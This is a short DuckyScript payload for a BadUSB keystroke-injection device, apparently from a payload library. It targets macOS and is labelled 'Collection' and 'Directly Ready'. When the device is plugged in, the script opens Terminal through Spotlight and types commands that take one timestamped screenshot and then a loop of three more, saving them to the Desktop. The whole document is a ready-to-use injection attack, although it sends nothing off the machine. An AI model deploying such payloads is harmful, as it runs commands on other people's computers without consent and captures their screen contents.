REM Title: macOS Screenshot Taker
REM Author: BadUSB Library
REM Description: Takes screenshots and saves to Desktop
REM Target: macOS 10.15+
REM Category: Collection
REM Type: Directly Ready

REM Open Terminal
DELAY 2000
GUI SPACE
DELAY 1000
STRING Terminal
ENTER
DELAY 3000

REM Take screenshot
STRING screencapture ~/Desktop/screenshot_$(date +%Y%m%d_%H%M%S).png
ENTER
DELAY 2000

REM Take multiple screenshots
STRING for i in {1..3}; do screencapture ~/Desktop/screenshot_$i.png; sleep 3; done
ENTER
DELAY 2000
